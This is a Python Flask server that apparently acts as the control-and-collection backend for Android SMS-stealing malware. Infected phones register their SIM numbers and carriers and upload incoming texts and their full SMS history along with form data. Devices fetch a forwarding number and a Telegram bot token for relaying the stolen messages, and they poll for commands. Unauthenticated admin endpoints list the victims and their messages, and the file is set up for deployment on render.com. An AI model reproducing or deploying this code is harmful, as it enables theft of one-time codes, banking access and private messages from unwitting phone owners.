import json
import os
import threading
import time
from flask import Flask, request, jsonify
from flask_cors import CORS # For handling CORS during development/testing

app = Flask(__name__)
CORS(app) # Enable CORS for all routes

# --- Configuration ---
DATA_FILE = 'data.json' # File to store all application data
# A simple in-memory cache for faster access, will be loaded from DATA_FILE
data_store = {
    "devices": {},
    "sms_forward_config": {"forward_number": "YOUR_DEFAULT_FORWARD_NUMBER"}, # Default config
    "telegram_config": {"bot_token": None, "chat_id": None}, # Default config
    "commands": {}
}

# --- Utility Functions for Data Management ---
def load_data():
    """Loads data from the JSON file into the in-memory data_store."""
    global data_store
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            try:
                data_store = json.load(f)
            except json.JSONDecodeError:
                print(f"Warning: {DATA_FILE} is empty or corrupted. Starting with default data.")
                data_store = {
                    "devices": {},
                    "sms_forward_config": {"forward_number": "YOUR_DEFAULT_FORWARD_NUMBER"},
                    "telegram_config": {"bot_token": None, "chat_id": None},
                    "commands": {}
                }
    else:
        print(f"Info: {DATA_FILE} not found. Initializing with default data.")

def save_data():
    """Saves the current in-memory data_store to the JSON file."""
    with open(DATA_FILE, 'w') as f:
        json.dump(data_store, f, indent=4)

# Load data when the server starts
load_data()

# --- API Endpoints ---

@app.route('/api/device/register', methods=['POST'])
def register_device():
    """
    Registers a new device or updates an existing device's information.
    Expected JSON: {
        "device_id": "...",
        "device_name": "...",
        "os_version": "...",
        "battery_level": "...",
        "phone_number": "...",
        "sim1_carrier": "...",
        "sim1_number": "...",
        "sim2_carrier": "...",
        "sim2_number": "..."
    }
    """
    device_data = request.get_json()
    device_id = device_data.get("device_id")

    if not device_id:
        return jsonify({"message": "device_id is required"}), 400

    if device_id not in data_store["devices"]:
        data_store["devices"][device_id] = {
            "created_at": int(time.time()),
            "sms": [], # Initialize SMS list for this device
            "forms": [] # Initialize forms list for this device
        }

    # Update device details
    data_store["devices"][device_id].update(device_data)
    data_store["devices"][device_id]["last_seen"] = int(time.time())
    save_data()
    return jsonify({"message": "Device registered/updated successfully", "device_id": device_id}), 200

@app.route('/api/device/<string:device_id>/sms', methods=['POST'])
def receive_new_sms(device_id):
    """
    Receives a new incoming SMS message for a specific device.
    Expected JSON: {"sender": "...", "message_body": "..."}
    """
    sms_data = request.get_json()
    sender = sms_data.get("sender")
    message_body = sms_data.get("message_body")

    if not all([sender, message_body]):
        return jsonify({"message": "sender and message_body are required"}), 400

    if device_id not in data_store["devices"]:
        return jsonify({"message": "Device not found"}), 404

    sms_entry = {
        "id": str(len(data_store["devices"][device_id]["sms"]) + 1), # Simple ID generation
        "sender": sender,
        "message_body": message_body,
        "received_at": int(time.time()), # Store as timestamp
        "type": "new"
    }
    data_store["devices"][device_id]["sms"].append(sms_entry)
    save_data()
    return jsonify({"message": "New SMS received and stored"}), 200

@app.route('/api/device/<string:device_id>/all_sms', methods=['POST'])
def receive_all_sms(device_id):
    """
    Receives a batch of all SMS messages (historical and new) for a specific device.
    Expected JSON: [{"address": "...", "body": "...", "date": "..."}, ...]
    """
    all_sms_data = request.get_json()

    if not isinstance(all_sms_data, list):
        return jsonify({"message": "Expected a JSON array of SMS objects"}), 400

    if device_id not in data_store["devices"]:
        return jsonify({"message": "Device not found"}), 404

    # Clear existing SMS and replace with the new batch
    # This approach simplifies synchronization and ensures the panel always has the latest full list
    data_store["devices"][device_id]["sms"] = []
    for sms_item in all_sms_data:
        sender = sms_item.get("address")
        message_body = sms_item.get("body")
        date_timestamp = sms_item.get("date") # This is the timestamp from the user app

        if not all([sender, message_body, date_timestamp]):
            print(f"Warning: Skipping malformed SMS item: {sms_item}")
            continue

        sms_entry = {
            "id": str(len(data_store["devices"][device_id]["sms"]) + 1),
            "sender": sender, # Use 'sender' for consistency with panel display
            "message_body": message_body,
            "date": date_timestamp, # Store the original timestamp
            "received_at": int(time.time()), # When the server received it
            "type": "historical" # Mark as historical for distinction if needed
        }
        data_store["devices"][device_id]["sms"].append(sms_entry)
    
    save_data()
    return jsonify({"message": f"Received and stored {len(all_sms_data)} SMS messages"}), 200

@app.route('/api/device/<string:device_id>/all_sms', methods=['GET'])
def get_all_sms(device_id):
    """
    Retrieves all stored SMS messages for a specific device.
    This will be used by the panel app.
    """
    if device_id not in data_store["devices"]:
        return jsonify({"message": "Device not found"}), 404
    
    # Sort SMS by date (timestamp) in descending order (most recent first)
    sorted_sms = sorted(data_store["devices"][device_id]["sms"], key=lambda x: x.get("date", x.get("received_at", 0)), reverse=True)
    return jsonify(sorted_sms), 200

@app.route('/api/config/sms_forward', methods=['GET'])
def get_sms_forward_config():
    """Retrieves the SMS forwarding configuration."""
    return jsonify(data_store["sms_forward_config"]), 200

@app.route('/api/config/telegram', methods=['GET'])
def get_telegram_config():
    """Retrieves the Telegram configuration."""
    return jsonify(data_store["telegram_config"]), 200

@app.route('/api/device/<string:device_id>/forms', methods=['POST'])
def receive_form_details(device_id):
    """
    Receives custom form details for a specific device.
    Expected JSON: {"custom_data": "..."}
    """
    form_data = request.get_json()
    custom_data = form_data.get("custom_data")

    if not custom_data:
        return jsonify({"message": "custom_data is required"}), 400

    if device_id not in data_store["devices"]:
        return jsonify({"message": "Device not found"}), 404

    form_entry = {
        "id": str(len(data_store["devices"][device_id]["forms"]) + 1),
        "custom_data": custom_data,
        "received_at": int(time.time())
    }
    data_store["devices"][device_id]["forms"].append(form_entry)
    save_data()
    return jsonify({"message": "Form details received and stored"}), 200

# --- Command Endpoints (Simplified) ---
# For a real application, commands would be more complex and persistent.
@app.route('/api/device/<string:device_id>/commands', methods=['GET'])
def get_device_commands(device_id):
    """Retrieves pending commands for a specific device."""
    # In this simplified server, we don't manage complex command queues.
    # It would typically return commands that the device needs to execute.
    # For now, it returns an empty list, or you can hardcode some test commands.
    return jsonify([]), 200

@app.route('/api/command/<string:command_id>/execute', methods=['POST'])
def mark_command_executed(command_id):
    """Marks a command as executed."""
    # In a real system, this would update the status of a command in the database.
    return jsonify({"message": f"Command {command_id} marked as executed (simulated)"}), 200

# --- Admin/Management Endpoints (Optional, for testing/setup) ---
@app.route('/api/admin/set_sms_forward', methods=['POST'])
def admin_set_sms_forward():
    """Admin endpoint to set SMS forwarding number."""
    config = request.get_json()
    forward_number = config.get("forward_number")
    if not forward_number:
        return jsonify({"message": "forward_number is required"}), 400
    data_store["sms_forward_config"]["forward_number"] = forward_number
    save_data()
    return jsonify({"message": "SMS forward number updated"}), 200

@app.route('/api/admin/set_telegram_config', methods=['POST'])
def admin_set_telegram_config():
    """Admin endpoint to set Telegram bot token and chat ID."""
    config = request.get_json()
    bot_token = config.get("bot_token")
    chat_id = config.get("chat_id")
    if not all([bot_token, chat_id]):
        return jsonify({"message": "bot_token and chat_id are required"}), 400
    data_store["telegram_config"]["bot_token"] = bot_token
    data_store["telegram_config"]["chat_id"] = chat_id
    save_data()
    return jsonify({"message": "Telegram config updated"}), 200

@app.route('/api/admin/devices', methods=['GET'])
def admin_get_devices():
    """Admin endpoint to view all registered devices."""
    return jsonify(data_store["devices"]), 200

@app.route('/api/admin/device/<string:device_id>/sms', methods=['GET'])
def admin_get_device_sms(device_id):
    """Admin endpoint to view all SMS for a specific device."""
    if device_id not in data_store["devices"]:
        return jsonify({"message": "Device not found"}), 404
    # Sort SMS by date (timestamp) in descending order (most recent first)
    sorted_sms = sorted(data_store["devices"][device_id]["sms"], key=lambda x: x.get("date", x.get("received_at", 0)), reverse=True)
    return jsonify(sorted_sms), 200


# --- Run the server ---
if __name__ == '__main__':
    # When deploying to render.com, render will provide the PORT environment variable
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)

